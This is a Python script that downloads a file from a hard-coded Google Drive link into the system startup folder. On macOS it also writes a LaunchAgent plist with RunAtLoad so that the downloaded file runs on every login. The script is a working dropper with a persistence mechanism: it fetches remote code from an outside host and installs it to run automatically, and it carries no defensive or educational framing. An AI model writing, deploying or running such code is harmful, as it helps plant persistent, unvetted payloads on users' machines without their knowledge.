import os
import requests
import shutil
import platform
from urllib.parse import urlparse, unquote

def download_file(url, local_filename):
    # Stream download the file
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            shutil.copyfileobj(r.raw, f)
    return local_filename

def get_startup_folder():
    system = platform.system()
    if system == 'Windows':
        return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif system == 'Darwin':  # macOS
        return os.path.expanduser('~/Library/LaunchAgents')
    else:
        raise OSError('Unsupported operating system')

def extract_filename_from_url(url):
    parsed_url = urlparse(url)
    filename = os.path.basename(parsed_url.path)
    return unquote(filename)

def main(download_link):
    try:
        startup_folder = get_startup_folder()
        original_filename = extract_filename_from_url(download_link)
        local_filename = os.path.join(startup_folder, original_filename)

        # Download the file
        download_file(download_link, local_filename)
        print(f'File downloaded and placed in startup folder: {local_filename}')

        # For macOS, additional steps are required to create a LaunchAgent
        if platform.system() == 'Darwin':
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.{os.path.splitext(original_filename)[0]}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>{local_filename}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.join(startup_folder, f'com.example.{os.path.splitext(original_filename)[0]}.plist')
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            print(f'LaunchAgent plist created: {plist_path}')

    except Exception as e:
        print(f'Error: {e}')

# Replace with your instant download link
download_link = 'https://drive.google.com/uc?export=download&id=1ta-dmpv4l49zckLAHX5jEXppMO78yNn7'
main(download_link)
